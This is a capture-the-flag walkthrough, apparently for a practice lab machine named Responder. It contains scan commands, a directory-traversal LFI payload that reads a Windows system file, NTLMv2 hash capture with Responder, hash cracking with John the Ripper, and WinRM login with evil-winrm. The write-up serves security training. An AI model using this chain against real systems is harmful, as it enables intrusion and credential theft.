@@ -1,0 +1,135 @@
+Responder
+Nmap Enumeration
+
+Ping was performed on the target:
+
+ping 10.129.96.108
+
+The host appeared to be online.
+
+A normal Nmap scan was slow and unresponsive, suggesting the presence of filtering or firewall rules. Therefore, a SYN scan with host discovery disabled was used.
+
+nmap -sS -T4 --top-ports 1000 -Pn 10.129.96.108
+Results
+80/tcp   open  http
+5985/tcp open  WinRM
+
+To identify service versions:
+
+nmap -sV -Pn 10.129.96.108
+
+The target was identified as a Windows host.
+
+Web Enumeration
+
+Accessing the website through the IP address did not display the expected content.
+
+Checking the HTTP headers:
+
+curl -I http://10.129.96.108
+
+Further testing revealed references to a domain named:
+
+unika.htb
+
+This suggested that the web server was using virtual hosting and expected requests containing the correct hostname.
+
+Host File Configuration
+
+The hostname was added to the local hosts file.
+
+sudo nano /etc/hosts
+
+Add:
+
+10.129.96.108    unika.htb
+
+Testing:
+
+curl http://unika.htb/
+
+The website now loaded correctly.
+
+Local File Inclusion Discovery
+
+The application contained a parameter used to load language pages.
+
+Testing showed that the parameter was vulnerable to Local File Inclusion (LFI).
+
+Example:
+
+http://unika.htb/?page=../../../../windows/system32/drivers/etc/hosts
+
+The application returned local file contents.
+
+Vulnerability Analysis
+
+Attack chain:
+
+User Input
+    ↓
+No Input Validation
+    ↓
+Directory Traversal
+    ↓
+Local File Inclusion
+    ↓
+Sensitive File Access
+
+The vulnerability allowed reading files from the server but did not immediately provide credentials.
+
+Capturing NTLM Authentication
+
+To obtain credentials, the server was forced to access an attacker-controlled network resource.
+
+Responder was started:
+
+sudo responder -I tun0
+
+The vulnerable parameter was used to request a file from the attacker's system.
+
+This caused the target to authenticate over SMB and leak an NTLMv2 hash.
+
+Responder successfully captured the authentication hash.
+
+Password Cracking
+
+The captured hash was cracked using John the Ripper.
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+Valid credentials were recovered.
+
+WinRM Access
+
+Using the recovered credentials, a connection was established through WinRM.
+
+evil-winrm -i 10.129.96.108 -u <username> -p <password>
+
+After successful authentication:
+
+whoami
+
+The user context was confirmed.
+
+Flag Retrieval
+
+Navigate to the user's desktop:
+
+cd C:\Users\<username>\Desktop
+
+Read the flag:
+
+type user.txt
+Skills Learned
+Nmap Enumeration
+Service Enumeration
+Virtual Host Discovery
+Host File Configuration
+Local File Inclusion (LFI)
+Directory Traversal
+NTLMv2 Hash Capture
+Responder
+John the Ripper
+WinRM Access
+Windows Enumeration
